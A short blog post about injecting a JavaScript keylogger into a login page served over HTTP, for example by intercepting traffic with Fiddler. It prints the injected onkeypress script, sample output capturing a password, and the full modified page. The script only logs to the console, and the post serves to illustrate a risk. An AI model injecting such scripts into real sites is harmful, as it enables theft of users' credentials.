---
layout: post
title:  "key logging"
date:   2017-06-07 21:21:37
categories: web-programming
excerpt: "injecting javascript to capture a users keystrokes"
tags:
  - javascript
  - hacking
---

I was watching a video today about injecting malicious JavaScript into webpages that are served over HTTP (not HTTPS).  Even if the `post` from the login form is HTTPS, it is still possible to steal the user's data if the script can be injected into a page loaded over HTTP.

Take this login form for example:

{% highlight html %}
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
    <div style="margin: auto; width: 250px; padding-top: 250px;">
      <form onsubmit="event.preventDefault();">
        User name:<br>
        <input type="text" name="username">
        <br>
        Password:<br>
        <input type="password" name="password">
        <br><br>
        <input id="myCheckbox" type="submit" value="Submit">
      </form>
    </div>
  </body>
</html>
{% endhighlight %}

Using Fiddler, it is possible to intercept the HTTP request, and inject a script by replacing the closing `<body>` tag with this:

{% highlight html %}
    <script>
      var sessionID = Math.random() * 1000;

      document.onkeypress = function(event) {
        var targetedElement = event.srcElement.name ? event.srcElement.name : event.srcElement.nodeName;

        console.log({
          key: event.key,
          htmlElement: targetedElement,
          sessionID: sessionID
        });
      };
    </script>
  </body>  
{% endhighlight %}

Here we are `console.log`ing the output, and in reality a much more powerful tool than Fiddler would be needed to make this intercept (such as some malware at a router level).  But imagine this data below being sent to a remote server.  It would be easy to reconstruct your session and determine what you typed into each text entry field and steal your login info.

script output:
{% highlight javascript %}
{key: "c", htmlElement: "password", sessionID: 799.5342152323906}
{key: "a", htmlElement: "password", sessionID: 799.5342152323906}
{key: "t", htmlElement: "password", sessionID: 799.5342152323906}
{% endhighlight %}

here's the full html

{% highlight html %}
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
    <div style="margin: auto; width: 250px; padding-top: 250px;">
      <form onsubmit="event.preventDefault();">
        User name:<br>
        <input type="text" name="username">
        <br>
        Password:<br>
        <input type="password" name="password">
        <br><br>
        <input id="myCheckbox" type="submit" value="Submit">
      </form>
    </div>
    <script>
      var sessionID = Math.random() * 1000;

      document.onkeypress = function(event) {
        var targetedElement = event.srcElement.name ? event.srcElement.name : event.srcElement.nodeName;

        console.log({
          key: event.key,
          htmlElement: targetedElement,
          sessionID: sessionID
        });
      };
    </script>
  </body>
</html>
{% endhighlight %}
